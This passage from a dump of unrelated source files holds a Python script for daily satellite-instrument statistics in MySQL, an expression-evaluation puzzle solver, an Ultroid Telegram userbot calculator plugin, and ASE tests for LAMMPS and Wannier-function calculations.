conf.grep + ' ' \\\n\t+ ' -v bash | ' + conf.grep + ' ' + fname + ' | ' + conf.grep \\\n\t+ \" '\\-\\-sat=\" + sat + \"' | \" + conf.grep + \" '\\-\\-ins=\" + ins + \"' | \" \\\n\t+ conf.grep + \" '\\-\\-nwp=\" + nwp + \"' | \" + conf.awk + \" '{print $4}'\"\n(status, value) = commands.getstatusoutput(cmd)\npid_list = value.split()\nfor one_pid in pid_list:\n\tif int(one_pid) != pid:\n\t\tmsg = 'more then one prog find, kill old same prog[' + one_pid + ']'\n\t\tcommon.err(my_log, log_tag, time_tag + msg)\n\t\tcmd = conf.kill + ' -kill ' + one_pid\n\t\tcommands.getstatusoutput(cmd)\n\n\"\"\"\nWe MUST create fy3b-mwts INFO db, for easy time search, not show tables!!\nalso, there is a BUG... ...\n\"\"\"\nshow_table_sql = \"show tables like '%\" + timespan['begin_str'][0:4] \\\n                + timespan['begin_str'][5:7] + timespan['begin_str'][8:10] \\\n                + \"%OBC%' \"\ntry:\n    conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                         user=conf.db_setting['master']['user'],\n                         passwd=conf.db_setting['master']['pwd'], \n                         port=conf.db_setting['master']['port'])\n    cur=conn.cursor()\n    conn.select_db(conf.table_setting[sat][ins]['data_db'])\n    cur.execute(show_table_sql) # the result is already sorted by ascii.\n    all_tables = cur.fetchall()\n    cur.close()\n    conn.close()\nexcept MySQLdb.Error, e:\n\tmsg = 'FAILED`Mysql Fatal Error[' + str(e.args[0])+']: '+e.args[1] \n\tcommon.err(my_log, log_tag, time_tag + msg)\n\tsys.exit(3)\n\n# ignore L1B table.\n#all_obc_table = [ x for x in all_tables if 'OBCXX_MS' in x[0] ]\n\nCalc_tag = 'OBCXX_MS_CALC'\nCalc_channel_tag='OBCXX_MS_CALC_'\nmy_calculate_table = [ x[0] for x in all_tables if Calc_tag in x[0]]\nmy_calc_channel_table=[ x[0] for x in all_tables if Calc_channel_tag in x[0]]\nmy_calculate_table =[ x for x in my_calculate_table if Calc_channel_tag not in x]\nchannel_tag = 'OBCXX_MS_' + str(ins_conf.channels)\n\nmy_channel_table = [ x[0] for x in all_tables if channel_tag in x[0]]\n\nmy_obc_table = [ x[0] for x in all_tables if 'OBCXX_MS_' not in x[0]]\n    #print obc_table\n\n\n \nprint 'begin'\nprint my_obc_table\nprint'------------------'\nprint my_calc_channel_table\nprint '------------------'\nprint my_channel_table\nprint '------------------'\nprint my_calculate_table\n\n#channel_tag = 'OBCXX_MS_' + str(ins_conf.channels)\n#my_channel_table = [ x[0] for x in all_tables if channel_tag in x[0]]\n#calculate_tag = 'OBCXX_MS_CALC'\n#my_calculate_table=[ x[0] for x in all_tables if calculate_tag in x[0]]\n#my_obc_table = [ x[0] for x in all_tables if channel_tag not in x[0]]\n#my_obc_table = [ x for x in my_obc_table if calculate_tag not in x]\n\nif len(my_channel_table)<=0:\n    msg = time_tag + 'no table found for 3-dims data'\n    common.warn(my_log, log_tag, msg)\n    sys.exit(4)\nif len(my_calculate_table)<=0:\n    msg = time_tag + 'no table found for calculate data'\n    common.warn(my_log, log_tag, msg)\n    \nif len(my_calc_channel_table)<=0:\n    msg = time_tag + 'no table found for 3-dims calculate data'\n    common.warn(my_log, log_tag, msg)\n    if(ins=='mwhs'):\n        sys.exit(4)\n#     if(ins!='mwts'):\n#         sys.exit(4)\nif len(my_obc_table)<=0:\n    msg = time_tag + 'no table found for 2-dims obc data'\n    common.error(my_log, log_tag, msg)\n    sys.exit(4)\ncommon.debug(my_log, log_tag, \"calculate tables:::::::::::::::::::::::::::::::::::::::::::::::::::::::::;\")   \nprint(my_obc_table)\n# get insert sql to STAT db.\ndaily_table = conf.table_setting[sat][ins]['daily']\ndaily_channel_table = conf.table_setting[sat][ins]['daily_channel']\ndaily_sql = 'replace into ' + daily_table + \" values('\"+timespan['begin_str'] \\\n\t    \t+ \"', '%s', %s, %s, %s, %s, %s)\"\ndaily_channel_sql = 'replace into ' + daily_channel_table + \" values('\" \\\n            + timespan['begin_str'] + \"', '%s', %s, %s, %s, %s, %s, %s)\"\n\n#pool = Pool()\n#ret = pool.map(calc_daily, ['just_obc'] + range(1, ins_conf.channels + 1) )\n#pool.close()\n#pool.join()\ncalc_daily('just_obc')\nfor channel in range(1,ins_conf.channels+1):\n    calc_daily(channel)\n\n\n# \n# if False in ret:\n# \tmsg = 'FAILED`calc failed.`timeuse='\n# else:\n# \tmsg = 'SUCC`program finish.`timeuse='\n#  \t\n# timeuse_end = time.time()\n# timeuse = str(round(timeuse_end - timeuse_begin, 2))\n# common.info(my_log, log_tag, time_tag + msg + timeuse)\n\n", "63": "import re\r\n\r\nclass Calc(int):\r\n    def __mul__(self,im):\r\n        return Calc(int(self)*im)\r\n    def __truediv__(self,im):\r\n        return Calc(int(self)+im)\r\n    def __sub__(self,im):\r\n        return Calc(int(self)*im)\r\n        \r\n\r\ndef evalA(exp):\r\n    exp = re.sub(r\"(\\d+)\", r\"Calc(\\1)\", exp)\r\n    exp = exp.replace(\"+\", \"/\")\r\n    return eval(exp,{},{\"Calc\":Calc})\r\n\r\ndef evalB(exp):\r\n    exp = re.sub(r\"(\\d+)\", r\"Calc(\\1)\", exp)\r\n    exp = exp.replace(\"+\", \"/\")\r\n    exp = exp.replace(\"*\", \"-\")\r\n    return eval(exp,{},{\"Calc\":Calc})\r\n\r\nwith open('18.txt') as data:\r\n    data=data.read().splitlines()\r\n    \r\n#Part A\r\n\r\nprint(f'Part A: {sum(evalA(l) for l in data)}')\r\nprint(f'Part B: {sum(evalB(l) for l in data)}')", "64": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "65": "import pytest\nimport numpy as np\nfrom ase import Atom\nfrom ase.build import bulk\nimport ase.io\nfrom ase import units\nfrom ase.md.verlet import VelocityVerlet\n\n\n@pytest.fixture\ndef Atoms_fcc_Ni_with_H_at_center():\n    atoms = bulk(\"Ni\", cubic=True)\n    atoms += Atom(\"H\", position=atoms.cell.diagonal() / 2)\n    return atoms\n\n\n@pytest.fixture\ndef lammps_data_file_Fe(datadir):\n    return datadir / \"lammpslib_simple_input.data\"\n\n\n@pytest.fixture\ndef calc_params_Fe(lammps_data_file_Fe):\n    calc_params = {}\n    calc_params[\"lammps_header\"] = [\n        \"units           real\",\n        \"atom_style      full\",\n        \"boundary        p p p\",\n        \"box tilt        large\",\n        \"pair_style      lj/cut/coul/long 12.500\",\n        \"bond_style      harmonic\",\n        \"angle_style     harmonic\",\n        \"kspace_style    ewald 0.0001\",\n        \"kspace_modify   gewald 0.01\",\n        f\"read_data      {lammps_data_file_Fe}\",\n    ]\n    calc_params[\"lmpcmds\"] = []\n    calc_params[\"atom_types\"] = {\"Fe\": 1}\n    calc_params[\"create_atoms\"] = False\n    calc_params[\"create_box\"] = False\n    calc_params[\"boundary\"] = False\n    calc_params[\"log_file\"] = \"test.log\"\n    calc_params[\"keep_alive\"] = True\n    return calc_params\n\n\n@pytest.fixture\ndef Atoms_Fe(lammps_data_file_Fe):\n    Atoms_Fe = ase.io.read(\n        lammps_data_file_Fe,\n        format=\"lammps-data\",\n        Z_of_type={1: 26},\n        units=\"real\",\n    )\n    return Atoms_Fe\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator(\"lammpslib\")\ndef test_lammpslib_simple(\n    factory,\n    calc_params_NiH,\n    Atoms_fcc_Ni_with_H_at_center,\n    calc_params_Fe,\n    Atoms_Fe,\n):\n    \"\"\"\n    Get energy from a LAMMPS calculation of an uncharged system.\n    This was written to run with the 30 Apr 2019 version of LAMMPS,\n    for which uncharged systems require the use of 'kspace_modify gewald'.\n    \"\"\"\n    NiH = Atoms_fcc_Ni_with_H_at_center\n\n    # Add a bit of distortion to the cell\n    NiH.set_cell(\n        NiH.cell + [[0.1, 0.2, 0.4], [0.3, 0.2, 0.0], [0.1, 0.1, 0.1]],\n        scale_atoms=True,\n    )\n\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n\n    E = NiH.get_potential_energy()\n    F = NiH.get_forces()\n    S = NiH.get_stress()\n\n    print(\"Energy: \", E)\n    print(\"Forces:\", F)\n    print(\"Stress: \", S)\n    print()\n\n    E = NiH.get_potential_energy()\n    F = NiH.get_forces()\n    S = NiH.get_stress()\n\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n\n    E2 = NiH.get_potential_energy()\n    F2 = NiH.get_forces()\n    S2 = NiH.get_stress()\n\n    assert E == pytest.approx(E2, rel=1e-4)\n    assert F == pytest.approx(F2, rel=1e-4)\n    assert S == pytest.approx(S2, rel=1e-4)\n\n    NiH.rattle(stdev=0.2)\n    E3 = NiH.get_potential_energy()\n    F3 = NiH.get_forces()\n    S3 = NiH.get_stress()\n\n    print(\"rattled atoms\")\n    print(\"Energy: \", E3)\n    print(\"Forces:\", F3)\n    print(\"Stress: \", S3)\n    print()\n\n    assert not np.allclose(E, E3)\n    assert not np.allclose(F, F3)\n    assert not np.allclose(S, S3)\n\n    # Add another H\n    NiH += Atom(\"H\", position=NiH.cell.diagonal() / 4)\n    E4 = NiH.get_potential_energy()\n    F4 = NiH.get_forces()\n    S4 = NiH.get_stress()\n\n    assert not np.allclose(E4, E3)\n    assert not np.allclose(F4[:-1, :], F3)\n    assert not np.allclose(S4, S3)\n\n    # the example from the docstring\n\n    NiH = Atoms_fcc_Ni_with_H_at_center\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n    print(\"Energy \", NiH.get_potential_energy())\n\n    # a more complicated example, reading in a LAMMPS data file\n    calc = factory.calc(**calc_params_Fe)\n    Atoms_Fe.calc = calc\n    with VelocityVerlet(Atoms_Fe, 1 * units.fs) as dyn:\n        energy = Atoms_Fe.get_potential_energy()\n        assert energy == pytest.approx(2041.411982950972, rel=1e-4)\n\n        dyn.run(10)\n        energy = Atoms_Fe.get_potential_energy()\n        assert energy == pytest.approx(312.4315854721744, rel=1e-4)\n", "66": "import pytest\nimport numpy as np\nfrom functools import partial\nfrom ase import Atoms\nfrom ase.transport.tools import dagger, normalize\nfrom ase.dft.kpoints import monkhorst_pack\nfrom ase.build import molecule, bulk\nfrom ase.io.cube import read_cube\nfrom ase.lattice import CUB, FCC, BCC, TET, BCT, ORC, ORCF, ORCI, ORCC, HEX, \\\n    RHL, MCL, MCLC, TRI, OBL, HEX2D, RECT, CRECT, SQR, LINE\nfrom ase.dft.wannier import gram_schmidt, lowdin, \\\n    neighbor_k_search, calculate_weights, steepest_descent, md_min, \\\n    rotation_from_projection, init_orbitals, scdm, Wannier, \\\n    search_for_gamma_point, arbitrary_s_orbitals\nfrom ase.dft.wannierstate import random_orthogonal_matrix\n\n\ncalc = pytest.mark.calculator\nNk = 2\ngpts = (8, 8, 8)\n\n\n@pytest.fixture()\ndef rng():\n    return np.random.RandomState(0)\n\n\n@pytest.fixture(scope='module')\ndef _base_calculator_gpwfile(tmp_path_factory, factories):\n    \"\"\"\n    Generic method to cache calculator in a file on disk.\n    \"\"\"\n    def __base_calculator_gpwfile(atoms, filename,\n                                  nbands, gpts=gpts,\n                                  kpts=(Nk, Nk, Nk)):\n        factories.require('gpaw')\n        import gpaw\n        gpw_path = tmp_path_factory.mktemp('sub') / filename\n        calc = gpaw.GPAW(\n            gpts=gpts,\n            nbands=nbands,\n            kpts={'size': kpts, 'gamma': True},\n            symmetry='off',\n            txt=None)\n        atoms.calc = calc\n        atoms.get_potential_energy()\n        calc.write(gpw_path, mode='all')\n        return gpw_path\n    return __base_calculator_gpwfile\n\n\n@pytest.fixture(scope='module')\ndef _h2_calculator_gpwfile(_base_calculator_gpwfile):\n    atoms = molecule('H2', pbc=True)\n    atoms.center(vacuum=3.)\n    gpw_path = _base_calculator_gpwfile(\n        atoms=atoms,\n        filename='wan_h2.gpw',\n        nbands=4\n    )\n    return gpw_path\n\n\n@pytest.fixture(scope='module')\ndef h2_calculator(_h2_calculator_gpwfile):\n    import gpaw\n    return gpaw.GPAW(_h2_calculator_gpwfile, txt=None)\n\n\n@pytest.fixture(scope='module')\ndef _si_calculator_gpwfile(_base_calculator_gpwfile):\n    atoms = bulk('Si')\n    gpw_path = _base_calculator_gpwfile(\n        atoms=atoms,\n        filename='wan_si.gpw',\n        nbands=8\n    )\n    return gpw_path\n\n\n@pytest.fixture(scope='module')\ndef si_calculator(_si_calculator_gpwfile):\n    import gpaw\n    return gpaw.GPAW(_si_calculator_gpwfile, txt=None)\n\n\n@pytest.fixture(scope='module')\ndef _ti_calculator_gpwfile(_base_calculator_gpwfile):\n    atoms = bulk('Ti', crystalstructure='hcp')\n    gpw_path = _base_calculator_gpwfile(\n        atoms=atoms,\n        filename='wan_ti.gpw',\n        nbands=None\n    )\n    return gpw_path\n\n\n@pytest.fixture(scope='module')\ndef ti_calculator(_ti_calculator_gpwfile):\n    import gpaw\n    return gpaw.GPAW(_ti_calculator_gpwfile, txt=None)\n\n\n@pytest.fixture\ndef wan(rng, h2_calculator):\n    def _wan(\n        atoms=None,\n        calc=None,\n        nwannier=2,\n        fixedstates=None,\n        fixedenergy=None,\n        initialwannier='bloch',\n        functional='std',\n        kpts=None,\n        file=None,\n        rng=rng,\n        full_calc=False,\n        std_calc=True,\n    ):\n        \"\"\"\n        Generate a Wannier object.\n\n        full_calc: the provided calculator has a converged calculation\n        std_calc: the default H2 calculator object is used\n        \"\"\"\n        # If the calculator, or some fundamental parameters, are provided\n        # we clearly do not want a default calculator\n        if calc is not None or kpts is not None or atoms is not None:\n            std_calc = False\n            # Default value for kpts, if we need to generate atoms/calc\n            if kpts is None:\n                kpts = (Nk, Nk, Nk)\n\n        if std_calc:\n            calc = h2_calculator\n            full_calc = True\n        elif atoms is None and not full_calc:\n            pbc = (np.array(kpts) > 1).any()\n            atoms = molecule('H2', pbc=pbc)\n            atoms.center(vacuum=3.)\n\n        if calc is None:\n            gpaw = pytest.importorskip('gpaw')\n            calc = gpaw.GPAW(\n                gpts=gpts,\n                nbands=nwannier,\n                kpts=kpts,\n                symmetry='off',\n                txt=None\n            )\n\n        if not full_calc:\n            atoms.calc = calc\n            atoms.get_potential_energy()\n\n        return Wannier(\n            nwannier=nwannier,\n            fixedstates=fixedstates,\n            fixedenergy=fixedenergy,\n            calc=calc,\n            initialwannier=initialwannier,\n            file=None,\n            functional=functional,\n            rng=rng,\n        )\n    return _wan\n\n\ndef bravais_lattices():\n    return [CUB(1), FCC(1), BCC(1), TET(1, 2), BCT(1, 2),\n            ORC(1, 2, 3), ORCF(1, 2, 3), ORCI(1, 2, 3),\n            ORCC(1, 2, 3), HEX(1, 2), RHL(1, 110),\n            MCL(1, 2, 3, 70), MCLC(1, 2, 3, 70),\n            TRI(1, 2, 3, 60, 70, 80), OBL(1, 2, 70),\n            HEX2D(1), RECT(1, 2), CRECT(1, 70), SQR(1),\n            LINE(1)]\n\n\nclass Paraboloid:\n\n    def __init__(self, pos=(10., 10., 10.), shift=1.):\n        self.pos = np.array(pos, dtype=complex)\n        self.shift = shift\n\n    def get_gradients(self):\n        return 2 * self.pos\n\n    def step(self, dF, updaterot=True, updatecoeff=True):\n        self.pos -= dF\n\n    def get_functional_value(self):\n        return np.sum(self.pos**2) + self.shift\n\n\ndef unitarity_error(matrix):\n    return np.abs(dagger(matrix) @ matrix - np.eye(len(matrix))).max()\n\n\ndef orthogonality_error(matrix):\n    errors = []\n    for i in range(len(matrix)):\n        for j in range(i + 1, len(matrix)):\n            errors.append(np.abs(dagger(matrix[i]) @ matrix[j]))\n    return np.max(errors)\n\n\ndef normalization_error(matrix):\n    old_matrix = matrix.copy()\n    normalize(matrix)\n    return np.abs(matrix - old_matrix).max()\n\n\ndef test_gram_schmidt(rng):\n    matrix = rng.random((4, 4))\n    assert unitarity_error(matrix) > 1\n    gram_schmidt(matrix)\n    assert unitarity_error(matrix) < 1e-12\n\n\ndef test_lowdin(rng):\n    matrix = rng.random((4, 4))\n    assert unitarity_error(matrix) > 1\n    lowdin(matrix)\n    assert unitarity_error(matrix) < 1e-12\n\n\ndef test_random_orthogonal_matrix(rng):\n    dim = 4\n    matrix = random_orthogonal_matrix(dim, rng=rng, real=True)\n    assert matrix.shape[0] == matrix.shape[1]\n    assert unitarity_error(matrix) < 1e-12\n    matrix = random_orthogonal_matrix(dim, rng=rng, real=False)\n    assert matrix.shape[0] == matrix.shape[1]\n    assert unitarity_error(matrix) < 1e-12\n\n\ndef test_neighbor_k_search():\n    kpt_kc = monkhorst_pack((4, 4, 4))\n    Gdir_dc = [[1, 0, 0], [0, 1, 0], [0, 0, 1],\n               [1, 1, 0], [1, 0, 1], [0, 1, 1]]\n    tol = 1e-4\n    for d, Gdir_c in enumerate(Gdir_dc):\n        for k, k_c in enumerate(kpt_kc):\n            kk, k0 = neighbor_k_search(k_c, Gdir_c, kpt_kc, tol=tol)\n            assert np.linalg.norm(kpt_kc[kk] - k_c - Gdir_c + k0) < tol\n\n\n@pytest.mark.parametrize('lat', bravais_lattices())\ndef test_calculate_weights(lat):\n    # Equation from Berghold et al. PRB v61 n15 (2000)\n    tol = 1e-5\n    cell = lat.tocell()\n    g = cell @ cell.T\n    w, G = calculate_weights(cell, normalize=False)\n\n    errors = []\n    for i in range(3):\n        for j in range(3):\n            errors.append(np.abs((w * G[:, i] @ G[:, j]) - g[i, j]))\n\n    assert np.max(errors) < tol\n\n\ndef test_steepest_descent():\n    tol = 1e-6\n    step = 0.1\n    func = Paraboloid(pos=np.array([10, 10, 10], dtype=float), shift=1.)\n    steepest_descent(func=func, step=step, tolerance=tol)\n    assert func.get_functional_value() == pytest.approx(1, abs=1e-5)\n\n\ndef test_md_min():\n    tol = 1e-8\n    step = 0.1\n    func = Paraboloid(pos=np.array([10, 10, 10], dtype=complex), shift=1.)\n    md_min(func=func, step=step, tolerance=tol,\n           max_iter=1e6)\n    assert func.get_functional_value() == pytest.approx(1, abs=1e-5)\n\n\ndef test_rotation_from_projection(rng):\n    proj_nw = rng.random((6, 4))\n    assert unitarity_error(proj_nw[:int(min(proj_nw.shape))]) > 1\n    U_ww, C_ul = rotation_from_projection(proj_nw, fixed=2, ortho=True)\n    assert unitarity_error(U_ww) < 1e-10, 'U_ww not unitary'\n    assert orthogonality_error(C_ul.T) < 1e-10, 'C_ul columns not orthogonal'\n    assert normalization_error(C_ul) < 1e-10, 'C_ul not normalized'\n    U_ww, C_ul = rotation_from_projection(proj_nw, fixed=2, ortho=False)\n    assert normalization_error(U_ww) < 1e-10, 'U_ww not normalized'\n\n\n@pytest.mark.calculator_lite\ndef test_save(tmpdir, wan):\n    wanf = wan(nwannier=4, fixedstates=2, initialwannier='bloch')\n    jsonfile = tmpdir.join('wanf.json')\n    f1 = wanf.get_functional_value()\n    wanf.save(jsonfile)\n    wanf.initialize(file=jsonfile, initialwannier='bloch')\n    assert pytest.approx(f1) == wanf.get_functional_value()\n\n\n@pytest.mark.parametrize('lat', bravais_lattices())\ndef test_get_radii(lat, wan):\n    # Sanity check, the Wannier functions' spread should always be positive.\n    # Also, make sure that the method does not fail for any lattice.\n    if ((lat.tocell() == FCC(a=1).tocell()).all() or\n            (lat.tocell() == ORCF(a=1, b=2, c=3).tocell()).all()):\n        pytest.skip(\"Lattices not supported by this function,\"\n                    \" use get_spreads() instead.\")\n    atoms = molecule('H2', pbc=True)\n    atoms.cell = lat.tocell()\n    atoms.center(vacuum=3.)\n    wanf = wan(nwannier=4, fixedstates=2, atoms=atoms, initialwannier='bloch')\n    assert all(wanf.get_radii() > 0)\n\n\n@pytest.mark.parametrize('lat', bravais_lattices())\ndef test_get_spreads(lat, wan):\n    # Sanity check, the Wannier functions' spread should always be positive.\n    # Also, make sure that the method does not fail for any lattice.\n    atoms = molecule('H2', pbc=True)\n    atoms.cell = lat.tocell()\n    atoms.center(vacuum=3.)\n    wanf = wan(nwannier=4, fixedstates=2, atoms=atoms, initialwannier='bloch')\n    assert all(wanf.get_spreads() > 0)\n\n\n@pytest.mark.parametrize('fun', ['std', 'var'])\ndef test_get_functional_value(fun, wan):\n    # Only testing if the functional scales with the number of functions\n    wan1 = wan(nwannier=3, functional=fun)\n    f1 = wan1.get_functional_value()\n    wan2 = wan(nwannier=4)\n    f2 = wan2.get_functional_value()\n    assert f1 < f2\n\n\n@pytest.mark.calculator_lite\n@calc('gpaw')\ndef test_get_centers(factory):\n    # Rough test on the position of the Wannier functions' centers\n    gpaw = pytest.importorskip('gpaw')\n    calc = gpaw.GPAW(gpts=(32, 32, 32), nbands=4, txt=None)\n    atoms = molecule('H2', calculator=calc)\n    atoms.center(vacuum=3.)\n    atoms.get_potential_energy()\n    wanf = Wannier(nwannier=2, calc=calc, initialwannier='bloch')\n    centers = wanf.get_centers()\n    com = atoms.get_center_of_mass()\n    assert np.abs(centers - [com, com]).max() < 1e-4\n\n\ndef test_write_cube_default(wan, h2_calculator, testdir):\n    # Chek the value saved in the CUBE file and the atoms object.\n    # The default saved value is the absolute value of the Wannier function,\n    # and the supercell is repeated per the number of k-points in each\n    # direction.\n    atoms = h2_calculator.atoms\n    wanf = wan(calc=h2_calculator, full_calc=True)\n    index = 0\n\n    # It returns some errors when using file objects, so we use a string\n    cubefilename = 'wanf.cube'\n    wanf.write_cube(index, cubefilename)\n    with open(cubefilename, mode='r') as inputfile:\n        content = read_cube(inputfile)\n    assert pytest.approx(content['atoms'].cell.array) == atoms.cell.array * 2\n    assert pytest.approx(content['data']) == abs(wanf.get_function(index))\n\n\ndef test_write_cube_angle(wan, testdir):\n    # Check that the complex phase is correctly saved to the CUBE file, together\n    # with the right atoms object.\n    atoms = molecule('H2')\n    atoms.center(vacuum=3.)\n    wanf = wan(atoms=atoms, kpts=(1, 1, 1))\n    index = 0\n\n    # It returns some errors when using file objects, so we use a string\n    cubefilename = 'wanf.cube'\n    wanf.write_cube(index, cubefilename, angle=True)\n    with open(cubefilename, mode='r') as inputfile:\n        content = read_cube(inputfile)\n    assert pytest.approx(content['atoms'].cell.array) == atoms.cell.array\n    assert pytest.approx(content['data']) == np.angle(wanf.get_function(index))\n\n\ndef test_write_cube_repeat(wan, testdir):\n    # Check that the repeated supercell and Wannier functions are correctly\n    # saved to the CUBE file, together with the right atoms object.\n    atoms = molecule('H2')\n    atoms.center(vacuum=3.)\n    wanf = wan(atoms=atoms, kpts=(1, 1, 1))\n    index = 0\n    repetition = [4, 4, 4]\n\n    # It returns some errors when using file objects, so we use simple filename\n    cubefilename = 'wanf.cube'\n    wanf.write_cube(index, cubefilename, repeat=repetition)\n\n    with open(cubefilename, mode='r') as inputfile:\n        content = read_cube(inputfile)\n    assert pytest.approx(content['atoms'].cell.array) == \\\n        (atoms * repetition).cell.array\n    assert pytest.approx(content['data']) == \\\n        abs(wanf.get_function(index, repetition))\n\n\ndef test_localize(wan):\n    wanf = wan(initialwannier='random')\n    fvalue = wanf.get_functional_value()\n    wanf.localize()\n    assert wanf.get_functional_value() > fvalue\n\n\ndef test_get_spectral_weight_bloch(wan):\n    nwannier = 4\n    wanf = wan(initialwannier='bloch', nwannier=nwannier)\n    for i in range(nwannier):\n        assert wanf.get_spectral_weight(i)[:, i].sum() == pytest.approx(1)\n\n\ndef test_get_spectral_weight_random(wan, rng):\n    nwannier = 4\n    wanf = wan(initialwannier='random', nwannier=nwannier, rng=rng)\n    for i in range(nwannier):\n        assert wanf.get_spectral_weight(i).sum() == pytest.approx(1)\n\n\n@pytest.mark.calculator_lite\ndef test_get_pdos(wan):\n    nwannier = 4\n    gpaw = pytest.importorskip('gpaw')\n    calc = gpaw.GPAW(gpts=(16, 16, 16), nbands=nwannier, txt=None)\n    atoms = molecule('H2')\n    atoms.center(vacuum=3.)\n    atoms.calc = calc\n    atoms.get_potential_energy()\n    wanf = wan(atoms=atoms, calc=calc,\n               nwannier=nwannier, initialwannier='bloch')\n    eig_n = calc.get_eigenvalues()\n    for i in range(nwannier):\n        pdos_n = wanf.get_pdos(w=i, energies=eig_n, width=0.001)\n        assert pdos_n[i] != pytest.approx(0)\n\n\ndef test_translate(wan, h2_calculator):\n    nwannier = 2\n    calc = h2_calculator\n    atoms = calc.get_atoms()\n    wanf = wan(nwannier=nwannier, initialwannier='bloch',\n               calc=calc, full_calc=True)\n    wanf.translate_all_to_cell(cell=[0, 0, 0])\n    c0_w = wanf.get_centers()\n    for i in range(nwannier):\n        c2_w = np.delete(wanf.get_centers(), i, 0)\n        wanf.translate(w=i, R=[1, 1, 1])\n        c1_w = wanf.get_centers()\n        assert np.linalg.norm(c1_w[i] - c0_w[i]) == \\\n            pytest.approx(np.linalg.norm(atoms.cell.array.diagonal()))\n        c1_w = np.delete(c1_w, i, 0)\n        assert c1_w == pytest.approx(c2_w)\n\n\ndef test_translate_to_cell(wan, h2_calculator):\n    nwannier = 2\n    calc = h2_calculator\n    atoms = calc.get_atoms()\n    wanf = wan(nwannier=nwannier, initialwannier='bloch',\n               calc=calc, full_calc=True)\n    for i in range(nwannier):\n        wanf.translate_to_cell(w=i, cell=[0, 0, 0])\n        c0_w = wanf.get_centers()\n        assert (c0_w[i] < atoms.cell.array.diagonal()).all()\n        wanf.translate_to_cell(w=i, cell=[1, 1, 1])\n        c1_w = wanf.get_centers()\n        assert (c1_w[i] > atoms.cell.array.diagonal()).all()\n        assert np.linalg.norm(c1_w[i] - c0_w[i]) == \\\n            pytest.approx(np.linalg.norm(atoms.cell.array.diagonal()))\n        c0_w = np.delete(c0_w, i, 0)\n        c1_w = np.delete(c1_w, i, 0)\n        assert c0_w == pytest.approx(c1_w)\n\n\ndef test_translate_all_to_cell(wan, h2_calculator):\n    nwannier = 2\n    calc = h2_calculator\n    atoms = calc.get_atoms()\n    wanf = wan(nwannier=nwannier, initialwannier='bloch',\n               calc=calc, full_calc=True)\n    wanf.translate_all_to_cell(cell=[0, 0, 0])\n    c0_w = wanf.get_centers()\n    assert (c0_w < atoms.cell.array.diagonal()).all()\n    wanf.translate_all_to_cell(cell=[1, 1, 1])\n    c1_w = wanf.get_centers()\n    assert (c1_w > 